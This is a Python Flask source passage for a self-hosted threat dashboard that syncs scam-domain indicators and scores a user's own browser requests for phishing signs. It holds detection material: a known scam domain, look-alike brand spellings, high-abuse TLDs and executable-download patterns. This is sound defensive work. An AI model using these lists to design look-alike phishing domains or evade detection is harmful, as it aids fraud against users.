BASE_SCAM_DOMAINS = {"payweb360.com"}  # BBB Scam Tracker #1308291 (Harris & Harris fake debt collection)
_synced_domains: set[str] = set()
_ioc_state = {"version": 0, "cache_version": -1, "matchers": [], "last_ok": None, "last_error": None}


def scam_domains() -> set[str]:
    with _lock:
        return BASE_SCAM_DOMAINS | _synced_domains


def scam_domain_matchers() -> list[tuple[str, re.Pattern]]:
    with _lock:
        if _ioc_state["cache_version"] != _ioc_state["version"]:
            _ioc_state["matchers"] = [(d, re.compile(r"(?<![a-z0-9-])" + re.escape(_normalize(d)) + r"(?![a-z0-9])"))
                                      for d in sorted(BASE_SCAM_DOMAINS | _synced_domains)]
            _ioc_state["cache_version"] = _ioc_state["version"]
        return _ioc_state["matchers"]


def sync_phishguard_once() -> bool:
    if not PHISHGUARD_URL:
        return False
    try:
        r = _requests.get(PHISHGUARD_URL + "/api/iocs", timeout=5,
                          headers={"X-PhishGuard-Token": PHISHGUARD_TOKEN} if PHISHGUARD_TOKEN else {})
        data = r.json()
        if r.status_code != 200:
            raise ValueError(data.get("error") or f"HTTP {r.status_code}")
        doms = {d.strip().lower() for d in data.get("domains", []) if isinstance(d, str)}
        doms = {d for d in doms if re.fullmatch(r"(?:[a-z0-9-]+\.)+[a-z]{2,24}", d)}
        with _lock:
            if doms != _synced_domains:
                _synced_domains.clear()
                _synced_domains.update(doms)
                _ioc_state["version"] += 1
            _ioc_state["last_ok"], _ioc_state["last_error"] = _now_iso(), None
        return True
    except Exception as exc:
        with _lock:
            _ioc_state["last_error"] = str(exc)[:200]
        return False


# ══════════════════════════════════════════════════════════════════════════════
# BROWSER MONITOR — your own browser's requests, sent by the companion extension
# ══════════════════════════════════════════════════════════════════════════════
BROWSER_DB_PATH = os.path.join(DATA_DIR, "browser.db")
BROWSER_RETENTION_DAYS = int(os.environ.get("SOC_BROWSER_RETENTION_DAYS", "30"))
BROWSER_STORE_URLS = os.environ.get("SOC_BROWSER_STORE_URLS", "flagged")  # "flagged" (default) or "all"
BROWSER_FLAG = 30  # medium and above


def _load_browser_token() -> str:
    if os.environ.get("SOC_BROWSER_TOKEN"):
        return os.environ["SOC_BROWSER_TOKEN"]
    path = os.path.join(DATA_DIR, "browser_token.txt")
    try:
        with open(path) as f:
            tok = f.read().strip()
        if tok:
            return tok
    except OSError:
        pass
    tok = secrets.token_urlsafe(24)
    with open(path, "w") as f:
        f.write(tok)
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    return tok


BROWSER_TOKEN = _load_browser_token()

# Signals in URLs your own browser requests are weaker than in requests aimed at your server
# (reading about "routing numbers" isn't identity theft), so content categories count for less here.
BROWSER_WEIGHTS = {
    "known_scam_ioc": 70, "exploit": 50, "malware_delivery": 45, "ransomware_extortion": 40, "phishing": 30,
    "financial_fraud": 25, "emerging_2025": 25, "reconnaissance": 15, "identity_theft": 15,
    "social_engineering": 15, "exfiltration": 15,
}
BROWSER_TLDS = {"tk", "ml", "ga", "cf", "gq", "top", "xyz", "click", "icu", "buzz", "rest", "monster", "cfd", "sbs",
                "lol", "zip", "mov", "cyou", "quest"}
_EXEC_DL = re.compile(r"\.(?:exe|msi|scr|bat|cmd|ps1|vbs|jar|apk|dmg|pkg|iso|img|hta|lnk)$", re.I)


def registered_domain(host: str) -> str:
    host = (host or "").lower().strip(".")
    try:
        ipaddress.ip_address(host.strip("[]"))
        return host
    except ValueError:
        pass
    parts = host.split(".")
    if len(parts) >= 3 and len(parts[-1]) == 2 and parts[-2] in ("co", "com", "org", "net", "gov", "ac", "edu"):
        return ".".join(parts[-3:])
    return ".".join(parts[-2:]) if len(parts) >= 2 else host


BRAND_DOMAINS = {
    "paypal": ["paypal.com", "paypalobjects.com"], "apple": ["apple.com", "icloud.com", "apple-cloudkit.com", "mzstatic.com"],
    "icloud": ["icloud.com", "apple.com"], "amazon": ["amazon.com", "amazonaws.com", "media-amazon.com", "ssl-images-amazon.com"],
    "microsoft": ["microsoft.com", "microsoftonline.com", "live.com", "office.com", "outlook.com", "msauth.net", "azure.com"],
    "google": ["google.com", "googleapis.com", "gstatic.com", "youtube.com", "gmail.com", "googleusercontent.com",
               "google-analytics.com", "googletagmanager.com", "doubleclick.net", "googlevideo.com"],
    "chase": ["chase.com"], "wellsfargo": ["wellsfargo.com"], "bankofamerica": ["bankofamerica.com"], "citi": ["citi.com", "citibank.com"],
    "irs": ["irs.gov"], "usps": ["usps.com"], "fedex": ["fedex.com"], "ups": ["ups.com"], "dhl": ["dhl.com"],
    "netflix": ["netflix.com", "nflxvideo.net", "nflximg.net", "nflxso.net"], "facebook": ["facebook.com", "fbcdn.net", "facebook.net"],
    "instagram": ["instagram.com", "cdninstagram.com"], "whatsapp": ["whatsapp.com", "whatsapp.net"],
    "coinbase": ["coinbase.com"], "binance": ["binance.com"], "metamask": ["metamask.io"], "venmo": ["venmo.com"], "zelle": ["zellepay.com"],
}
LOOKALIKE_TOKENS = ["paypa1", "g00gle", "arnazon", "amaz0n", "micros0ft", "rnicrosoft", "app1e", "faceb00k", "netf1ix", "c0inbase"]
_LOGIN_PATH = re.compile(r"log-?in|sign-?in|verify|account|secure|password|wallet|webscr", re.I)
_LOCAL_NETS = [ipaddress.ip_network(n) for n in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
                                                 "169.254.0.0/16", "::1/128", "fe80::/10", "fc00::/7")]


def analyze_browser_url(url: str, rtype: str) -> dict:
    """Score a request YOUR browser made. Outgoing traffic needs stronger evidence than attacks on a server:
    a single topic word in a URL (a news story about ransomware) is not a threat, so content categories count
    only with two signals or when the word is in the site name; injection payloads count only in the query."""
    p = urlparse(url)
    host = (p.hostname or "").lower()
    site = registered_domain(host)
    findings: dict[str, set] = defaultdict(set)
    hits: list[dict] = []
    extra: list[tuple[int, str, str]] = []

    def add(cat, labels, where):
        for lbl in labels:
            if lbl not in findings[cat]:
                hits.append({"category": cat, "keyword": lbl, "source": where, "weight": BROWSER_WEIGHTS[cat]})
            findings[cat].add(lbl)

    path_q = _decoded_variants((p.path or "/") + ("?" + p.query if p.query else ""))
    query = _decoded_variants(p.query) if p.query else ""
    host_n = _normalize(host)
    for cat in BROWSER_WEIGHTS:
        if cat == "known_scam_ioc":
            continue
        if cat == "exploit":
            add(cat, _match(query, cat), "query")
            continue
        in_host, in_url = _match(host_n, cat), _match(path_q, cat)
        if in_host or len(set(in_url)) >= 2:
            add(cat, in_host, "site name")
            add(cat, in_url, "url")
    for d in scam_domains():
        if host == d or host.endswith("." + d):
            add("known_scam_ioc", [d], "site")
    if query:
        add("known_scam_ioc", [d for d, rx in scam_domain_matchers() if rx.search(query)], "link in URL")

    tokens = set(re.split(r"[.\-]", host))
    if any(t in host for t in LOOKALIKE_TOKENS):
        extra.append((30, "LOOKALIKE_BRAND", "Look-alike spelling of a brand in the site name"))
    else:
        for brand, official in BRAND_DOMAINS.items():
            if site in official:
                break
            if any(host.startswith(o + ".") or f".{o}." in host for o in official):
                extra.append((30, "BRAND_AS_SUBDOMAIN", f"Real {brand} address used as a prefix of another site ({site})"))
                break
            if brand in tokens:
                extra.append((25, "BRAND_ON_UNOFFICIAL_SITE", f"Uses the {brand} name on a site {brand} doesn't own ({site})"))
                break
    if host.startswith("xn--") or ".xn--" in host:
        extra.append((30, "LOOKALIKE_CHARACTERS", "Site name uses look-alike characters (punycode)"))
    try:
        ip = ipaddress.ip_address(host.strip("[]"))
        if rtype == "main_frame" and not any(ip in n for n in _LOCAL_NETS):
            extra.append((20, "RAW_IP_SITE", "Page opened by raw IP address instead of a name"))
            if _LOGIN_PATH.search(p.path or ""):
                extra.append((15, "RAW_IP_LOGIN", "Sign-in or account page on a raw IP address"))
    except ValueError:
        pass
    if host.rsplit(".", 1)[-1] in BROWSER_TLDS:
        extra.append((15, "HIGH_ABUSE_TLD", f"High-abuse domain ending .{host.rsplit('.', 1)[-1]}"))
    if site.count("-") >= 3:
        extra.append((10, "HYPHENATED_DOMAIN", "Many hyphens in the domain name (common in phishing sites)"))
    if rtype in ("main_frame", "sub_frame", "other") and _EXEC_DL.search(p.path or ""):
        extra.append((30, "EXECUTABLE_DOWNLOAD", f"Executable file download: {(p.path or '').rsplit('/', 1)[-1][:60]}"))
    cats = sorted(findings)
    risk = min(100, sum(BROWSER_WEIGHTS[c] for c in cats) + sum(x[0] for x in extra))
    reasons = [f"{THREAT_INTEL[h['category']]['label']}: {h['keyword']}" for h in hits[:4]] + [x[2] for x in extra]
    return {"host": host, "site": site, "categories": cats, "tags": [c.upper() for c in cats] + [x[1] for x in extra],
            "hits": hits[:10], "signals": [x[2] for x in extra], "reasons": reasons, "risk": risk,
            "severity": severity_for(risk)}


_bdb_lock = threading.Lock()
_bdb = sqlite3.connect(BROWSER_DB_PATH, check_same_thread=False)
_bdb.execute("PRAGMA journal_mode=WAL")
_bdb.executescript("""
CREATE TABLE IF NOT EXISTS browser_events (
  id INTEGER PRIMARY KEY, ts REAL, day TEXT, hour INTEGER, client TEXT, site TEXT, host TEXT, url TEXT,
  method TEXT, type TEXT, initiator_site TEXT, status INTEGER, error TEXT, ip TEXT,
  risk INTEGER, severity TEXT, tags TEXT, hits TEXT, reasons TEXT, blocked INTEGER);
CREATE INDEX IF NOT EXISTS ix_be_day ON browser_events(day);
CREATE INDEX IF NOT EXISTS ix_be_day_site ON browser_events(day, site);
CREATE INDEX IF NOT EXISTS ix_be_day_risk ON browser_events(day, risk);
CREATE TABLE IF NOT EXISTS browser_sites (site TEXT PRIMARY KEY, first_seen REAL, first_day TEXT, last_seen REAL, total INTEGER);
CREATE TABLE IF NOT EXISTS browser_blocklist (site TEXT PRIMARY KEY, reason TEXT, time TEXT);
CREATE TABLE IF NOT EXISTS browser_clients (id TEXT PRIMARY KEY, name TEXT, version TEXT, ua TEXT, last_seen REAL, events INTEGER);
""")
_bdb.commit()


def _bq(sql: str, args=()) -> list[tuple]:
    with _bdb_lock:
        return _bdb.execute(sql, args).fetchall()


def purge_browser_history() -> int:
    cutoff = time.time() - BROWSER_RETENTION_DAYS * 86400
    with _bdb_lock:
        n = _bdb.execute("DELETE FROM browser_events WHERE ts < ?", (cutoff,)).rowcount
        _bdb.execute("DELETE FROM browser_sites WHERE last_seen < ?", (cutoff,))
        _bdb.commit()
    return n


def _browser_authorized() -> bool:
    return hmac.compare_digest(request.headers.get("X-SOC-Browser-Token", ""), BROWSER_TOKEN)


def _day(ts: float) -> str:
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d")


@app.route("/api/browser/ping")
def browser_ping():
    if not _browser_authorized():
        return jsonify({"error": "Wrong browser token"}), 401
    return jsonify({"ok": True, "server": "SOC Threat Dashboard", "time": _now_iso()})


@app.route("/api/browser/events", methods=["POST"])
def browser_events():
    if not _browser_authorized():
        return jsonify({"error": "Wrong browser token"}), 401
    d = request.get_json(silent=True) or {}
    events, client = d.get("events"), d.get("client") or {}
    if not isinstance(events, list) or len(events) > 1000:
        return jsonify({"error": "Send a list of at most 1,000 events"}), 400
    cid = str(client.get("id") or "browser")[:64]
    own = {request.host.lower()}
    now = time.time()
    rows, sites, skipped, flagged = [], {}, 0, 0
    for ev in events:
        if not isinstance(ev, dict):
            skipped += 1
            continue
        url = str(ev.get("url") or "")[:4096]
        if not url.lower().startswith(("http://", "https://")):
            skipped += 1
            continue
        p = urlparse(url)
        if p.netloc.lower() in own:
            skipped += 1
            continue
        try:
            ts = float(ev.get("t", now * 1000)) / 1000
        except (TypeError, ValueError):
            ts = now
        ts = min(max(ts, now - 86400), now + 300)
        rtype = str(ev.get("type") or "other")[:24]
        a = analyze_browser_url(url, rtype)
        error = str(ev.get("error") or "")[:80]
        blocked = 1 if "BLOCKED_BY_CLIENT" in error else 0
        stored = url if (BROWSER_STORE_URLS == "all" or a["risk"] >= BROWSER_FLAG) else \
            f"{p.scheme}://{p.netloc}{p.path or '/'}"[:2048]
        try:
            status = int(ev.get("status") or 0)
        except (TypeError, ValueError):
            status = 0
        init_host = urlparse(str(ev.get("initiator") or "")).hostname or ""
        rows.append((ts, _day(ts), datetime.fromtimestamp(ts).hour, cid, a["site"], a["host"], stored,
                     str(ev.get("method") or "GET")[:10].upper(), rtype, registered_domain(init_host), status, error,
                     str(ev.get("ip") or "")[:45], a["risk"], a["severity"], json.dumps(a["tags"]), json.dumps(a["hits"]),
                     json.dumps(a["reasons"]), blocked))
        s = sites.setdefault(a["site"], [ts, ts, 0])
        s[0], s[1], s[2] = min(s[0], ts), max(s[1], ts), s[2] + 1
        if a["risk"] >= BROWSER_FLAG:
            flagged += 1
        if a["risk"] >= 55:
            verb = "opened" if rtype == "main_frame" else "blocked a request to" if blocked else "loaded"
            emit_alert(a["site"], "browser:" + ",".join(a["tags"]),
                       f"Your browser {verb} {a['host']} — {'; '.join(a['reasons'][:2])}", a["severity"], "BROWSER", a["risk"])
    with _bdb_lock:
        _bdb.executemany("""INSERT INTO browser_events (ts, day, hour, client, site, host, url, method, type, initiator_site,
                            status, error, ip, risk, severity, tags, hits, reasons, blocked)
                            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", rows)
        _bdb.executemany("""INSERT INTO browser_sites (site, first_seen, first_day, last_seen, total) VALUES (?,?,?,?,?)
                            ON CONFLICT(site) DO UPDATE SET
                              first_day = CASE WHEN excluded.first_seen < first_seen THEN excluded.first_day ELSE first_day END,
                              first_seen = MIN(first_seen, excluded.first_seen),
                              last_seen = MAX(last_seen, excluded.last_seen), total = total + excluded.total""",
                         [(site, v[0], _day(v[0]), v[1], v[2]) for site, v in sites.items()])
        _bdb.execute("""INSERT INTO browser_clients (id, name, version, ua, last_seen, events) VALUES (?,?,?,?,?,?)
                        ON CONFLICT(id) DO UPDATE SET name=excluded.name, version=excluded.version, ua=excluded.ua,
                        last_seen=excluded.last_seen, events=events+excluded.events""",
                     (cid, str(client.get("name") or "Browser")[:60], str(client.get("version") or "")[:20],
                      str(client.get("ua") or "")[:200], now, len(rows)))
        _bdb.commit()
    return jsonify({"accepted": len(rows), "skipped": skipped, "flagged": flagged})


def _event_row(r) -> dict:
    keys = ("id", "ts", "day", "hour", "client", "site", "host", "url", "method", "type", "initiator_site", "status",
            "error", "ip", "risk", "severity", "tags", "hits", "reasons", "blocked")
    e = dict(zip(keys, r))
    for k in ("tags", "hits", "reasons"):
        e[k] = json.loads(e[k] or "[]")
    e["time"] = datetime.fromtimestamp(e["ts"]).astimezone().isoformat(timespec="seconds")
    return e


@app.route("/api/browser/summary")
def browser_summary():
    denied = _admin_required()
    if denied:
        return denied
    day = request.args.get("day") or _day(time.time())
    if not re.fullmatch(r"\d{4}-\d{2}-\d{2}", day):
        return jsonify({"error": "day must be YYYY-MM-DD"}), 400
    total, pages, sites, flagged, blocked = _bq(
        f"""SELECT COUNT(*), COALESCE(SUM(type='main_frame'),0), COUNT(DISTINCT site),
            COALESCE(SUM(risk>={BROWSER_FLAG}),0), COALESCE(SUM(blocked),0) FROM browser_events WHERE day=?""", (day,))[0]
    hours = [{"hour": h, "requests": 0, "flagged": 0} for h in range(24)]
    for h, n, f in _bq(f"SELECT hour, COUNT(*), SUM(risk>={BROWSER_FLAG}) FROM browser_events WHERE day=? GROUP BY hour", (day,)):
        hours[h] = {"hour": h, "requests": n, "flagged": f or 0}
    with _bdb_lock:
        blocked_sites = {r[0] for r in _bdb.execute("SELECT site FROM browser_blocklist").fetchall()}
    top = [{"site": s, "requests": n, "pages": pg, "max_risk": mr, "severity": severity_for(mr), "flagged": fl,
            "blocked": s in blocked_sites}
           for s, n, pg, mr, fl in _bq(f"""SELECT site, COUNT(*) n, SUM(type='main_frame'), MAX(risk), SUM(risk>={BROWSER_FLAG})
                                          FROM browser_events WHERE day=? GROUP BY site ORDER BY n DESC LIMIT 15""", (day,))]
    new = [{"site": s, "first_seen": datetime.fromtimestamp(fs).astimezone().isoformat(timespec="seconds"), "requests": n}
           for s, fs, n in _bq("""SELECT s.site, s.first_seen, COUNT(e.id) FROM browser_sites s
                                  LEFT JOIN browser_events e ON e.site = s.site AND e.day = s.first_day
                                  WHERE s.first_day=? GROUP BY s.site ORDER BY s.first_seen DESC LIMIT 60""", (day,))]
    flagged_events = [_event_row(r) for r in _bq(
        f"SELECT * FROM browser_events WHERE day=? AND risk>={BROWSER_FLAG} ORDER BY risk DESC, ts DESC LIMIT 60", (day,))]
    types = dict(_bq("SELECT type, COUNT(*) FROM browser_events WHERE day=? GROUP BY type ORDER BY COUNT(*) DESC", (day,)))
    return jsonify({"day": day, "requests": total, "pages": pages, "sites": sites, "new_sites": len(new), "flagged": flagged,
                    "blocked": blocked, "hours": hours, "top_sites": top, "new_site_list": new,
                    "flagged_events": flagged_events, "types": types})


@app.route("/api/browser/days")
def browser_days():
    denied = _admin_required()
    if denied:
        return denied
    rows = _bq(f"""SELECT day, COUNT(*), SUM(risk>={BROWSER_FLAG}) FROM browser_events
                  GROUP BY day ORDER BY day DESC LIMIT ?""", (BROWSER_RETENTION_DAYS,))
    return jsonify([{"day": d, "requests": n, "flagged": f or 0} for d, n, f in rows])


@app.route("/api/browser/events")
def browser_event_list():
    denied = _admin_required()
    if denied:
        return denied
    day = request.args.get("day") or _day(time.time())
    site = request.args.get("site", "")
    min_risk = request.args.get("min_risk", type=int, default=0)
    limit = max(1, min(request.args.get("limit", type=int, default=200), 1000))
    sql, args = "SELECT * FROM browser_events WHERE day=? AND risk>=?", [day, min_risk]
    if site:
        sql += " AND site=?"
        args.append(site)
    return jsonify([_event_row(r) for r in _bq(sql + " ORDER BY ts DESC LIMIT ?", (*args, limit))])


@app.route("/api/browser/status")
def browser_status():
    denied = _admin_required()
    if denied:
        return denied
    now = time.time()
    clients = [{"id": i, "name": n, "version": v, "last_seen_s": round(now - ls), "events": ev}
               for i, n, v, ls, ev in _bq("SELECT id, name, version, last_seen, events FROM browser_clients ORDER BY last_seen DESC")]
    return jsonify({"connected": any(c["last_seen_s"] < 300 for c in clients), "clients": clients,
                    "retention_days": BROWSER_RETENTION_DAYS, "store_urls": BROWSER_STORE_URLS,
                    "scam_feed": {"phishguard_url": PHISHGUARD_URL, "domains": len(scam_domains()),
                                  "last_ok": _ioc_state["last_ok"], "last_error": _ioc_state["last_error"]}})


@app.route("/api/browser/token")
def browser_token():
    denied = _admin_required()
    if denied:
        return denied
    return jsonify({"token": BROWSER_TOKEN, "endpoint": request.host_url.rstrip("/")})


@app.route("/api/browser/blocklist")
def browser_blocklist():
    if not (_browser_authorized() or _is_admin()):
        return jsonify({"error": "Not allowed"}), 401
    return jsonify([{"site": s, "reason": r, "time": t} for s, r, t in _bq("SELECT site, reason, time FROM browser_blocklist ORDER BY time DESC")])


@app.route("/api/browser/block", methods=["POST"])
def browser_block():
    denied = _admin_required()
    if denied:
        return denied
    d = request.get_json(silent=True) or {}
    raw = str(d.get("site") or "").strip().lower()
    host = urlparse(raw).hostname if "://" in raw else raw.split("/")[0].split(":")[0]
    site = registered_domain(host or "")
    if not re.fullmatch(r"(?:[a-z0-9-]+\.)+[a-z0-9-]{2,63}", site):
        return jsonify({"error": "Enter a site name like example.com"}), 400
    if site in {registered_domain(request.host.split(":")[0])}:
        return jsonify({"error": "Can't block the dashboard itself"}), 400
    with _bdb_lock:
        _bdb.execute("INSERT OR REPLACE INTO browser_blocklist (site, reason, time) VALUES (?,?,?)",
                     (site, str(d.get("reason") or "Blocked from the dashboard")[:200], _now_iso()))
        _bdb.commit()
    return jsonify({"status": "blocked", "site": site})


@app.route("/api/browser/unblock", methods=["POST"])
def browser_unblock():
    denied = _admin_required()
    if denied:
        return denied
    site = str((request.get_json(silent=True) or {}).get("site") or "").strip().lower()
    with _bdb_lock:
        n = _bdb.execute("DELETE FROM browser_blocklist WHERE site=?", (site,)).rowcount
        _bdb.commit()
    return (jsonify({"status": "unblocked", "site": site}), 200) if n else (jsonify({"error": "Not blocked"}), 404)


def _background_jobs():
    last_purge = 0.0
    while True:
        if time.time() - last_purge > 6 * 3600:
            purge_browser_history()
            last_purge = time.time()
        sync_phishguard_once()
        time.sleep(600)


@app.route("/")
def dashboard():
    return Response(DASHBOARD_HTML, mimetype="text/html")


# ══════════════════════════════════════════════════════════════════════════════
# DASHBOARD
# ══════════════════════════════════════════════════════════════════════════════
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SOC Threat Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
:root{
  --bg:#0a0f1c; --panel:#0f1629; --panel-2:#141d33; --line:#1d2842; --line-2:#2a3858;
  --text:#e3e9f5; --muted:#9aa8c7; --faint:#6b7a99;
  --accent:#2dd4bf; --accent-ink:#04201c;
  --crit:#f43f5e; --high:#fb923c; --med:#facc15; --low:#38bdf8; --info:#64748b; --ok:#34d399;
  --sans:'IBM Plex Sans',system-ui,-apple-system,'Segoe UI',sans-serif;
  --mono:'IBM Plex Mono',ui-monospace,'SF Mono',Menlo,Consolas,monospace;
  --r:12px;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.45}
body{min-height:100vh;background:
  radial-gradient(900px 500px at 0% -10%,rgba(45,212,191,.06),transparent 60%),
  radial-gradient(800px 500px at 100% 110%,rgba(244,63,94,.05),transparent 60%),var(--bg)}
button{font-family:inherit;cursor:pointer}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}

/* header */
.top{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:16px;flex-wrap:wrap;
  padding:12px 22px;background:rgba(10,15,28,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;letter-spacing:.01em}
.brand-mark{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;
  background:linear-gradient(135deg,#134e4a,#0f766e);box-shadow:inset 0 0 0 1px rgba(45,212,191,.35)}
.brand small{display:block;font-size:11px;font-weight:500;color:var(--faint);letter-spacing:.04em}
.pill{display:inline-flex;align-items:center;gap:7px;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:600;
  border:1px solid var(--line-2);color:var(--muted);background:var(--panel)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 3px rgba(52,211,153,.18)}
.pill.down .dot{background:var(--crit);box-shadow:0 0 0 3px rgba(244,63,94,.18)}
.pill.paused .dot{background:var(--med);box-shadow:0 0 0 3px rgba(250,204,21,.18)}
.spacer{flex:1}
.clock{font-family:var(--mono);font-size:12px;color:var(--faint)}
.btn{display:inline-flex;align-items:center;gap:6px;border-radius:8px;padding:7px 12px;font-size:13px;font-weight:600;
  border:1px solid var(--line-2);background:var(--panel-2);color:var(--text);transition:.15s}
.btn:hover{border-color:var(--faint)}
.btn.primary{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
.btn.primary:hover{filter:brightness(1.08)}
.btn.danger{background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.45);color:#fda4af}
.btn.ghost{background:transparent}
.btn.sm{padding:4px 9px;font-size:12px}
.btn:disabled{opacity:.5;cursor:not-allowed}

/* layout */
.page{padding:18px 22px 40px;max-width:1680px;margin:0 auto}
.kpis{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:12px;margin-bottom:16px}
.kpi{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);padding:14px 16px;position:relative;overflow:hidden}
.kpi::after{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--c,var(--accent))}
.kpi-l{font-size:12px;color:var(--muted);font-weight:500}
.kpi-v{font-family:var(--mono);font-size:26px;font-weight:600;margin-top:4px;color:var(--text)}
.kpi-s{font-size:11px;color:var(--faint);margin-top:2px}
.grid{display:grid;grid-template-columns:minmax(0,1.75fr) minmax(290px,1fr) minmax(290px,1fr);gap:16px;align-items:start}
.col{display:flex;flex-direction:column;gap:16px;min-width:0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;min-width:0}
.card-h{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--line)}
.card-t{font-size:13px;font-weight:600;letter-spacing:.01em}
.card-sub{font-size:12px;color:var(--faint)}
.card-b{max-height:420px;overflow:auto}
.card-b::-webkit-scrollbar,.tbl-wrap::-webkit-scrollbar{width:8px;height:8px}
.card-b::-webkit-scrollbar-thumb,.tbl-wrap::-webkit-scrollbar-thumb{background:var(--line-2);border-radius:8px}
#map{height:330px;background:#0b1222}
.leaflet-container{background:#0b1222;font-family:var(--sans)}
.leaflet-popup-content-wrapper,.leaflet-popup-tip{background:var(--panel-2);color:var(--text);border:1px solid var(--line-2)}
.leaflet-popup-content{font-size:12px;margin:10px 12px}
.leaflet-control-attribution{background:rgba(10,15,28,.7)!important;color:var(--faint)!important}
.leaflet-control-attribution a{color:var(--muted)!important}
.legend{display:flex;gap:12px;flex-wrap:wrap;font-size:11px;color:var(--muted)}
.legend i{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:5px;vertical-align:middle}

/* filters */
.filters{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:10px 16px;border-bottom:1px solid var(--line)}
.chip{border:1px solid var(--line-2);background:transparent;color:var(--muted);border-radius:999px;padding:4px 10px;font-size:12px;font-weight:600}
.chip[aria-pressed="true"]{background:var(--panel-2);color:var(--text);border-color:var(--faint)}
.chip b{font-family:var(--mono);font-weight:500;margin-left:4px;color:var(--faint)}
.search{flex:1;min-width:160px;background:var(--bg);border:1px solid var(--line-2);border-radius:8px;color:var(--text);
  padding:7px 10px;font-family:var(--mono);font-size:12px}
.search::placeholder{color:var(--faint)}

/* table */
.tbl-wrap{max-height:470px;overflow:auto}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th{position:sticky;top:0;background:var(--panel-2);color:var(--muted);font-weight:600;font-size:11.5px;text-align:left;
  padding:8px 12px;border-bottom:1px solid var(--line-2);white-space:nowrap;z-index:1}
td{padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:middle}
tbody tr{cursor:pointer;transition:background .1s}
tbody tr:hover{background:rgba(148,163,184,.06)}
tbody tr.sev-critical{box-shadow:inset 3px 0 0 var(--crit)}
tbody tr.sev-high{box-shadow:inset 3px 0 0 var(--high)}
.mono{font-family:var(--mono)}
.ip{font-family:var(--mono);color:#7dd3fc;font-weight:500;white-space:nowrap}
.tags{margin-top:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:250px}
.req{font-family:var(--mono);color:var(--muted);max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.req b{color:var(--text);font-weight:600;margin-right:6px}
.loc{color:var(--muted);white-space:nowrap;max-width:170px;overflow:hidden;text-overflow:ellipsis}
.loc.sub{font-size:11.5px;margin-top:2px}
td.mono{white-space:nowrap}
.tag{display:inline-block;font-size:10.5px;font-weight:600;padding:2px 7px;border-radius:5px;margin:1px 3px 1px 0;
  background:rgba(148,163,184,.1);color:var(--muted);border:1px solid rgba(148,163,184,.18);white-space:nowrap}
.sev{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:700;padding:2px 8px;border-radius:999px;
  text-transform:uppercase;letter-spacing:.04em;white-space:nowrap}
.sev-critical .sevc,.sev.critical{color:#fecdd3;background:rgba(244,63,94,.16);border:1px solid rgba(244,63,94,.45)}
.sev.high{color:#fed7aa;background:rgba(251,146,60,.14);border:1px solid rgba(251,146,60,.45)}
.sev.medium{color:#fef08a;background:rgba(250,204,21,.12);border:1px solid rgba(250,204,21,.4)}
.sev.low{color:#bae6fd;background:rgba(56,189,248,.12);border:1px solid rgba(56,189,248,.4)}
.sev.info{color:#cbd5e1;background:rgba(100,116,139,.15);border:1px solid rgba(100,116,139,.4)}
.risk{display:flex;align-items:center;gap:8px;min-width:96px}
.bar{flex:1;height:6px;border-radius:6px;background:var(--line);overflow:hidden}
.bar>span{display:block;height:100%;border-radius:6px}
.risk .n{font-family:var(--mono);font-size:12px;width:24px;text-align:right}

/* lists */
.item{padding:11px 16px;border-bottom:1px solid var(--line)}
.item:last-child{border-bottom:none}
.item-top{display:flex;align-items:center;gap:8px;justify-content:space-between;margin-bottom:4px}
.item-msg{font-size:12.5px;color:var(--text);word-break:break-word}
.item-meta{font-size:11.5px;color:var(--faint);margin-top:3px}
.empty{padding:28px 18px;text-align:center;color:var(--faint);font-size:12.5px}
.empty strong{display:block;color:var(--muted);margin-bottom:4px;font-size:13px}
.catrow{display:grid;grid-template-columns:130px 1fr 34px;gap:10px;align-items:center;padding:7px 16px;font-size:12.5px}
.catrow .lbl{color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.catrow .cnt{font-family:var(--mono);text-align:right;color:var(--text)}
.src{display:flex;align-items:center;gap:10px;padding:9px 16px;border-bottom:1px solid var(--line);font-size:12.5px}
.src:last-child{border-bottom:none}
.src .grow{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.src>*:not(.grow){flex-shrink:0}
.kw{display:flex;align-items:center;gap:10px;padding:8px 16px;border-bottom:1px solid var(--line);font-size:12.5px}
.kw .k{flex:1;font-family:var(--mono);color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.kw .c{font-size:11px;color:var(--muted);white-space:nowrap}
